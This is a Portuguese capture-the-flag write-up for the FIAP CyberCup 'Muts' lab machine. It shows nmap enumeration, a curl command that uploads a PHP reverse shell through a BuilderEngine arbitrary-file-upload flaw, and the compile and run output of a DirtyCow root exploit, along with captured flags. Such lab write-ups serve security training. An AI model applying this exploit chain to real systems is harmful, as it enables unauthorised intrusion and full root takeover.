---
title: Muts
category: FIAP CyberCup
---

## Enumeration

### NMAP Scan

- Após ligar a maquina, executado os comandos abaixo para enumeração da VM

```plaintext
# Nmap 7.80 scan initiated Sat Jun 27 18:38:54 2020 as: nmap -sC -sV -Pn -oA quick 10.2.0.11
Nmap scan report for 10.2.0.11                                                                                       
Host is up (0.0029s latency).
Scanned at 2020-06-27 18:39:02 -03 for 161s
Not shown: 989 closed ports                                                                                          
PORT     STATE SERVICE     VERSION                                                                                   
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                  
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMicg98pQuoQKbqtp4SrKqiCeUCdVMojzPj9TQM1ETIkvcGzMqEFSweayAKO/9ZbCVfmzqhU+xt9v42cVYTbuGrLDDTE+Z6cZ2nmTSV92EgDeRMuRQ3E3Gy9oZ6QhFMFetPhDe3uH+KQMo9RUFZJgvckYiaiKYypHL+gxLhXdVGBAAAAFQCxv8bJP8R9Xc8H5k/PuUlMhUt+d
QAAAIEAjclDqWZRqhQPIOxth5arD/nhvkFFCfXHWwFh4oJQq82I1NKPpInrii7ihF50clLAs5kI6z/25sw+Hd3+vHz/KMWheh8Z82oiAm0dwOOF4KnGQVW8Ze5XoappS3+OFOJ8mk1StxS8pJzh7/aH+k5S4ehRw8InS9flVxhyiv2Znw8AAACANjD8TA+fEWlpnbK5w61pzJUHc7KyhtS+6+fqR+Q1JKTuc3Yb1duc
vdbhXo8/cGJnNlgFG1anlNua6Dp2KzjridXEmXV0yZHfXZKNyCjd1vhKdMz/V3sPlYwtPpIVBS7l1g43henKx7OsnmYG3Om3OpVNQXdHbUmQfrMOrG0vZNk=
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfmGWlJ/5I0AIb0AD08vS6WWQDg0/oiZwdFMDmA8yEtHCEvasNfZLnnW4eByrCANMnLGC6lGbbY288m9uP/cISt2cEGolH8p9nwV1pKUc+aAJzkMiBSC0A/0C5o9Pgm7M7Bb1rVykpUQmg/DZp6xEEKMlIOL9vf3uKspiIqkSEFdD6vPKAGy5wPXHosuBkvXrUg
o+drp09pT2lqXt8tbNrao2DxHRwkFge/QtfPN319CNMMRyj/st0wj+vlDxUfmMDzvAJcEQMC14B29WEkdfwbLzhbSvcpzIIZ0biNA+E4YMrtL9IlFO/kDN065IJRXPY6OJicM+IhkFdzS0uhREp
|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFOOuNYcmh1lnKXl53anHYpGEM/udK7ham2WOPhuvyZJOUYF/rxlas7KMo+UWZimVAedAUQYy5iq7nJlNjQpxQw=
|   256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2Tab8Mt8xFjZKPwPpXzg2x6a6WhRaWOJCzb+lOrrbE
53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux) 
| dns-nsid:                                           
|_  bind.version: 9.9.5-3-Ubuntu                      
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))                                                             
| http-methods:                                                                                                      
|_  Supported Methods: OPTIONS GET HEAD POST                                                                         
| http-robots.txt: 1 disallowed entry 
|_Hackers                        
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES TOP STLS UIDL AUTH-RESP-CODE PIPELINING CAPA
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:             
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind            
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42415/udp6  status     
|   100024  1          44244/tcp   status
|   100024  1          47634/udp   status
|_  100024  1          56681/tcp6  status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)                                                                                                                                                                                          
|_imap-capabilities: IDLE IMAP4rev1 ID SASL-IR more post-login LOGIN-REFERRALS LOGINDISABLEDA0001 have listed Pre-login LITERAL+ OK ENABLE capabilities STARTTLS
|_ssl-date: TLS randomness does not represent time                                                                   
445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
Service Info: Host: MUTS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| nbstat: NetBIOS name: MUTS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   MUTS<00>             Flags: <unique><active>
|   MUTS<03>             Flags: <unique><active>
|   MUTS<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56744/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41968/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15279/udp): CLEAN (Failed to receive data)
|   Check 4 (port 29481/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: muts
|   NetBIOS computer name: MUTS\x00
|   Domain name: 
|   FQDN: muts
|_  System time: 2020-06-27T17:39:17-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02:                     
|_    Message signing enabled but not required
| smb2-time:                                          
|   date: 2020-06-27T21:39:17                         
|_  start_date: N/A                       
                                                          
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 27 18:41:43 2020 -- 1 IP address (1 host up) scanned in 168.69 seconds


```

### 80/TCP

Ao acessar porta 80, identificado que temos uma instalação do BuilderEngine em modo de manutenção

![image-20200627184401907](C:\Users\dacruz\OneDrive\Notes\FIAP\CyberCup\muts.assets\image-20200627184401907.png)

- Ao buscar este produto no searchsploit, encontrado vulnerabilidade de **Arbitrary File Upload**

```plaintext
zurc@kali:/dcruz/fiap/cybercup/muts/scan$ searchsploit builderengine
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
BuilderEngine 3.5.0 - Arbitrary File Upload                                       | php/webapps/40390.php
BuilderEngine 3.5.0 - Arbitrary File Upload and Execution (Metasploit)            | php/remote/42025.rb
---------------------------------------------------------------------------------- ---------------------------------

```

- Ao verificar o exploit, visto que apenas é necessário fazer o upload do PHP utilizando o comando curl passando o arquivo do payload do shell reverso (pentestmonkey)

```bash
curl -F 'files=@shell.php' http://10.2.0.11//themes/dashboard/assets/plugins/jquery-file-upload/server/php/
{"files":[{"name":"shell.php","size":3460,"type":"application\/octet-stream","url":"http:\/\/10.2.0.11\/\/files\/shell.php","deleteUrl":"http:\/\/10.2.0.11\/themes\/dashboard\/assets\/plugins\/jquery-file-upload\/server\/php\/?file=shell.php","deleteType":"DELETE"}]}

```
  
- Executado arquivo e obtido shell reverso. Após isso obtido a flag de user.txt

```plaintext
www-data@Muts:/var/www$ cat user.txt 
bfbb7e6e6e88d9ae66848b9aeac6b289
```

## Escalação de privilégios

- A partir da maquina, executado LinEnum.sh e visto que existe a possibilidade de escalar privilégios utilizando o /bin/cp.

- Entretanto como nao temos a senha do user www-data, optamos por um exploit de kernel e a partir do **linux-exploit-suggester.sh** vimos que é passivel de epxloração usando dirty cow

```plaintext
Available information:                                                                                                                                                                                                                                                                                                                         
Kernel version: 3.13.0                                    
Architecture: i686                                                                                                   
Distribution: ubuntu                                                                                                 
Distribution version: 14.04                                                                                          
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed                                        
Package listing: from current OS                                                                                     
                                                                                                                      
Searching among:                                          
                                                                                                                      
74 kernel space exploits                                  
45 user space exploits                                    
                                                          
Possible Exploits:                                                                                                   
                                                                                                                      
cat: write error: Broken pipe                             
cat: write error: Broken pipe                                                                                        
cat: write error: Broken pipe                             
cat: write error: Broken pipe                             
cat: write error: Broken pipe                                                                                        
[+] [CVE-2016-5195] dirtycow                              
                                                          
    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails                                                                                                                                                       
    Exposure: highly probable                              
    Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
    Download URL: https://www.exploit-db.com/download/40611                                                           
    Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh   
```
  
```plaintext
www-data@Muts:/tmp$ gcc agoravai.c -o agoravai -pthread
agoravai.c: In function 'procselfmemThread':
agoravai.c:99:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
          lseek(f,map,SEEK_SET);
          ^
In file included from agoravai.c:27:0:
/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
  extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
agoravai.c: In function 'main':
agoravai.c:142:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
      printf("Size of binary: %d\n", st.st_size);
      ^
www-data@Muts:/tmp$               
www-data@Muts:/tmp$ ./agoravai 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 45420
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@Muts:/tmp# id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
root@Muts:/tmp# 
```

- Uma vez como root, obtido root.txt

```plaintext
root@Muts:/tmp# cat /root/root.txt
cat /root/root.txt
a10828bee17db751de4b936614558305
```
